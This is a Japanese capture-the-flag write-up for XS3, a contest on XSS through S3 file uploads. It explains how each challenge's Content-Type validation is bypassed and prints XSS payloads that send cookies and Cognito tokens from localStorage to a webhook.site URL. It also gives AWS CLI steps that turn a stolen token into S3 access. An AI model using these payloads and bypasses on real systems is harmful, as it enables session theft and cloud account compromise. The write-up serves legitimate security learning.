---
title: "XS3 Writeup"
id: "XS3-Writeup"
description: "XS3 ChallengeのWriteupです。"
author: "rikoteki"
createdAt: "2024-04-04"
isDraft: true
---

# ToC

2024/3/28 17:00 JST ~ 2024/4/4 16:59 JSTで開催されたXS3に参加させていただいたのでWriteupです。

XSSとS3を題材にしたCTFのようです。

Introduction, Validation Bypass, Logic Bug, Advanced, Specialという難易度(?)設定がありました。

# Introduction

## Welcome Flag

Welcome問題です。

表示されるフラグを提出するのみ。

```
 flag{welcome_2_xs3}
```

## Server Side Upload

Webアプリケーションとクローラーのソースコードが渡されます。

WebアプリケーションはアップロードフォームとクローラーにアクセスさせるURLを報告するフォームがあります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/f6fbfc64-8081-4275-a35b-5ce5e8b37338)

特にソースコードを気にすることもなく下記のようなHTMLをアップロードした後、URLをクローラーに報告すればフラグ付きでアクセスしてくれました。

```html
<html>
  <body>
    <script>
      const c = btoa(document.cookie);
      fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
    </script>
  </body>
</html>
```

```
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
```

## Pre Signed Upload

クローラーのソースコードは変更が無いようでWebアプリケーションのソースコードのみが渡されます。

Webアプリケーションの画面も1問目と変わりません。

1問目同様HTMLをアップロードしようとすると拒否されます。

```
Failed to get presigned URL
```

ソースコードを確認すると、`/api/upload`へのリクエストでcontentTypeによるフィルタがあります。

リクエストボディ

```json
{"contentType":"text/html","length":186}
```

ソースコードのフィルタ部分

```typescript
  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

ただし、このリクエスト後に発生する署名付きURLを使用したアップロード時にはContent-Typeのチェックがされていないので`/api/upload`へのリクエストのcontentTypeを許可されたものに書き換えるだけでアップロードが可能になります。

```
{"contentType":"image/png","length":186}
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```

## POST Policy

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

今回の問題はファイルタイプをクライアント側でも検証している模様。

```
Invalid file type
```

かつ、問題名からもPost Policyを用いてContent-Typeを制限している模様。

ただし、`starts-with`を使用しているので`image`から開始していれば何でも許可される。

```typescript
  const filename = uuidv4();
  const s3 = new S3Client({});
  const { url, fields } = await createPresignedPost(s3, {
    Bucket: process.env.BUCKET_NAME!,
    Key: `upload/${filename}`,
    Conditions: [
      ['content-length-range', 0, 1024 * 1024 * 100],
      ['starts-with', '$Content-Type', 'image'],
    ],
    Fields: {
      'Content-Type': request.body.contentType,
    },
    Expires: 600,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    fields,
  });
```

Content-Typeをブラウザに推測させるため、適当な文字列を設定してみるとHTMLとして参照することができました。

```
{"contentType":"imageaaaa","length":186}
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}
```

# Validation Bypass

## Is the end safe?

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は`image/png`、`image/jpeg`、`image/jpg`のどれかで終端していることをチェックしている模様。

```typescript
const contentTypeValidator = (contentType: string) => {
    if (contentType.endsWith('image/png')) return true;
    if (contentType.endsWith('image/jpeg')) return true;
    if (contentType.endsWith('image/jpg')) return true;
    return false;
  };

  if (!contentTypeValidator(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

Content-Typeは`text/html;KEY=VALUE`のようにかけるので`VALUE`部分に`image/png`を入力することで検証をバイパスできるのではと考えてたらアップロードに成功しました。

```
text/html;x=image/png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}
```

## Just included?

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は、`;`が含まれていない、かつ`image/(jpg|jpeg|png|gif)$`の正規表現に当てはまるものかをチェックしています。

```typescript
 if (request.body.contentType.includes(';')) {
    return reply.code(400).send({ error: 'No file type (only type/subtype)' });
  }

  const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
  if (!allow.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

色々探していると下記URLにContent-Typeの区切り文字としてスペースも使えそうなことがわかりました。

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

以下のContent-Typeでアップロードが成功し、HTMLとして参照することができました。

```
text/html image/png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}
```


## forward priority...

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は、`allowContentTypes`のいずれかで開始、終端されているかチェックしている模様。

文字列の開始、終端以外は自由が有りますね。

```typescript
const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

  const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
  if (isAllowContentType.length === 0) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

色々探しているとfetch standard下記URLの`This is how extract a MIME type functions in practice: `のテーブル一番目の例が使えそうだと思いました。

https://fetch.spec.whatwg.org/#content-type-header

一部`Is the end safe?`で使ったテクニックも使って下記のようなContent-Typeにすることでアップロードが成功し、HTMLとして参照することができました。

```
image/jpg,text/html;charset=UTF-8,text/html;charset=image/jpg
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{f9eedd5f8b508ff8b03b803affb00d381826047b}
```

# Logic Bag

## Content extension 

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は`[\s\;()]`の正規表現にマッチする、または`allowExtension`以外の拡張子を弾いているようです。

`[\s\;()]`の部分でContent-Typeの区切り文字が制限されています。

```typescript
  const denyStringRegex = /[\s\;()]/;

  if (denyStringRegex.test(request.body.extention)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const allowExtention = ['png', 'jpeg', 'jpg', 'gif'];

  const isAllowExtention = allowExtention.filter((ext) => request.body.extention.includes(ext)).length > 0;
  if (!isAllowExtention) {
    return reply.code(400).send({ error: 'Invalid file extention' });
  }
```

`forward priority...`で利用したテクニックがここでも利用できそうです。

カンマで区切って最後に`text/html`をつけてやると後ろのContent-Typeとして参照される模様。

```
{
  "extention": "png,text/html"
  "length": 186
}
```

アップロードが成功しHTMLとして参照することができました。

```
image/aaaa,text/html,bbbb,png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}
```

もし正規表現でカンマ`,`が制限されててもJSON配列を`extension`として渡したら検証をバイパスできそう。

`includes`は配列に対しても効くし、JSONを文字列化するとカンマ区切りの文字列になる。

```json
{
  "extention": [
    "png",
    "text/html"
  ],
  "length": 186
}
```

# Advanced

## sniff? 

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は、以下の条件でチェックしている模様。

 - `[;,="\'()]`の正規表現にマッチしたら拒否
 - `image`で開始していなかったら拒否
 - `contentType`を`/`で区切りサブタイプが画像系の拡張子でなければ拒否

```typescript
  const denyStrings = new RegExp('[;,="\'()]');

  if (denyStrings.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid content type' });
  }

  if (!request.body.contentType.startsWith('image') || !['jpeg', 'jpg', 'png', 'gif'].includes(request.body.contentType.split('/')[1])) {
    return reply.code(400).send({ error: 'Invalid image type' });
  }
```

かつS3の`PutObjectCommand`には`/`で区切った0番目の値と1番目の値がそれぞれtype/subtypeとして設定されています。

```
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentType: `${request.body.contentType.split('/')[0]}/${request.body.contentType.split('/')[1]}`,
  });
```

これはガチャガチャやってたら解けた問題で、下記のようなContent-Typeでアップロードが成功し、HTMLとして参照することができました。

```
image text%2fhtml test/png
```

(`%2f`が`/`として認識されたのかMIME Sniffingさせてしまったのか…)

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{c4ca4238a0b923820dcc509a6f75849b}
```

## GEToken

Webアプリケーションのソースコード有り、Webアプリケーションの画面も変更はありません。

クローラーの変更が有り、Cognitoの認証情報をlocalStorageに保存した状態で報告したURLにアクセスしに来るようです。

```typescript
 await page.evaluate(
    (IdToken: string, AccessToken: string, RefreshToken: string) => {
      const randomNumber = Math.floor(Math.random() * 1000000);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.idToken`, IdToken);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.accessToken`, AccessToken);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.refreshToken`, RefreshToken);
    },
    IdToken,
    AccessToken,
    RefreshToken,
  );
```

Content-Typeの検証は以下のような感じです。

- `;`でMIME typeに分割
- `/`でtype,subtypeに分割、LowerCaseに変換
- type,subtypeいずれかが`[;,="\'()]`にマッチしたら拒否
- subtypeは`html, javascript, xml, json, svg, xhtml, xsl`を含んでいたら拒否

```typescript
  const [contentType, ...params] = request.body.contentType.split(';');
  const type = contentType.split('/')[0].toLowerCase();
  const subtype = contentType.split('/')[1].toLowerCase();

  const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];
  if (denyMimeSubTypes.includes(subtype)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
  const denyStrings = new RegExp('[;,="\'()]');
  if (denyStrings.test(type) || denyStrings.test(subtype)) {
    return reply.code(400).send({ error: 'Invalid Type or SubType' });
  }
```

`sniff?`で使用したような下記の文字列を送信することでアップロードに成功しました。

```
text%2fhtml / image%2fpng
```

が、ブラウザで参照するとファイルとしてダウンロードされる挙動になっており、XSSには至っていませんでした。

アップロードの際のリクエストを見直すと`Content-Disposition: attachment`がついておりこれが原因のようです。

幸い署名対象のヘッダにContent-Dispositionは含まれていなかったため、`Content-Disposition: inline`に改変して再度アップロードするとXSSが発火しました。

```typescript
const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type']),
  });
```

クローラーが変更されているためCognitoの認証情報をlocalStorageから取得するように変更したHTMLをアップロードします。

```html
<html>
  <body>
    <script>
      let cred = "";
      Object.keys(localStorage).forEach(k => {
        cred += `${k}:${localStorage[k]},`
      })
      fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+cred);
    </script>
  </body>
</html>
```

取得した`idToken`の中にフラグが入ってました。

```
flag{c81e728d9d4c2f636f067f89cc14862c}
```

## frame

Webアプリケーションのソースコード有り、クローラーの実装は変更無し。

Webアプリケーションの画面に変更が有り、アップロードしたファイルをiframeで参照できる機能が付きました。

アップロードしたファイルの参照URLは`/viewer/upload/{ID}`となります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/231d454e-5d6b-48ff-b1d0-97e5667093c8)

各リンクをクリックするとiframe内に画像が表示されます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/5808d14f-2eb3-497e-95b6-998ab9c6c0d1)

今回はContent-Typeの検証はなさそうでなんの形式のファイルでもアップロードできる模様。

ただし、署名対象のヘッダに`Content-Disposition`が追加されており、`attachment`に設定されていました。

まあiframeを利用するので…

```typescript
  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-disposition']),
  });
~~~~~~~~~
const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
    ContentDisposition: 'attachment',
  });
```

どうやらアップロードしたファイルを開く側のエンドポイント側にContent-Typeの検証がある模様。

`isDenyMimeSubType`関数で呼ばれる`extractMimeType`関数はContent-Typeを`/`で分割しており、分割後の値に対して`include`でチェックしているので適当な値でバイパスできそうです。

```
text/html aaaa
```

```javascript
      const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];

      const extractMimeType = (contentTypeAndParams) => {
        const [contentType, ...params] = contentTypeAndParams.split(';');
        console.log(`Extracting content type: ${contentType}`);
        console.log(`Extracting params: ${JSON.stringify(params)}`);
        const [type, subtype] = contentType.split('/');
        console.log(`Extracting type: ${type}`);
        console.log(`Extracting subtype: ${subtype}`);
        return { type, subtype, params };
      };

      const isDenyMimeSubType = (contentType) => {
        console.log(`Checking content type: ${contentType}`);
        const { subtype } = extractMimeType(contentType);
        return denyMimeSubTypes.includes(subtype.trim().toLowerCase());
      };

      window.onload = async () => {
        const url = new URL(window.location.href);
        const path = url.pathname.slice(1).split('/');
        path.shift();
        const key = path.join('/');
        console.log(`Loading file: /${key}`);

        const response = await fetch(`/${key}`);
        if (!response.ok) {
          console.error(`Failed to load file: /${key}`);
          document.body.innerHTML = '<h1>Failed to load file</h1>';
          return;
        }
        const contentType = response.headers.get('content-type');
        if (isDenyMimeSubType(contentType)) {
          console.error(`Failed to load file: /${key}`);
          document.body.innerHTML = '<h1>Failed to load file due to invalid content type</h1>';
          return;
        }
        const blobUrl = URL.createObjectURL(await response.blob());
        document.body.innerHTML = `<iframe src="${blobUrl}" style="width: 100%; height: 100%"></iframe>`;
      };
```

あとは、iframeからのCookie窃取となるのでHTMLを多少修正してアップロードすればフラグが取得できます。

```html
<html>
  <body>
    <script>
      const c = btoa(window.parent.document.cookie);
      fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
    </script>
  </body>
</html>
```
```
flag{d41d8cd98f00b204e9800998ecf8427e}
```

# Special

## I am ...

GETokenで取得したCognitoの認証情報を使ってS3からフラグを取得する問題です。

この問題は各種ドキュメントをあさりながら実行していきました。

GETokenで取得したidTokenを使用してidentityIdの取得

```bash
aws cognito-identity get-id \                                                                                         
      --identity-pool-id ap-northeast-1:05611045-eb46-41e2-9f6c-f41d87547e4d \
      --logins {ISS}={IDTOKEN} \
      --query "IdentityId"

"ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d"
```

identityIdを使用したアクセスキーの取得

```
aws cognito-identity get-credentials-for-identity \                                                                  
      --identity-id ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d \
      --logins {ISS}={IDTOKEN}
{
    "IdentityId": "ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d",
    "Credentials": {
        "AccessKeyId": "REDACTED",
        "SecretKey": "REDACTED",
        "SessionToken": "REDACTED",
        "Expiration": "2024-04-03T09:29:10+09:00"
    }
}

```

アクセスキーなどを環境変数に設定

```bash
export AWS_ACCESS_KEY_ID=REDACTED
export AWS_SECRET_ACCESS_KEY=REDACTED
export AWS_SECURITY_TOKEN="REDACTED"
```

S3にアクセス成功

`specialflagbucket`が見える。

```
aws s3 ls

2024-03-24 19:01:16 cdk-hnb659fds-assets-339713032412-ap-northeast-1
2024-03-24 22:36:30 deliverybucket-5250c0a74f-adv-3-delivery
2024-03-25 14:05:29 specialflagbucket-5250c0a74f-adv3-special-flag
2024-03-24 22:36:30 uploadbucket-5250c0a74f-adv-3-upload
```

ダウンロード

```bash
aws s3 sync s3://specialflagbucket-5250c0a74f-adv3-special-flag ./flag.txt

download: s3://specialflagbucket-5250c0a74f-adv3-special-flag/flag.txt to flag.txt/flag.txt
```

フラグ

```
flag{eccbc87e4b5ce2fe28308fd9f2a7baf3}
```
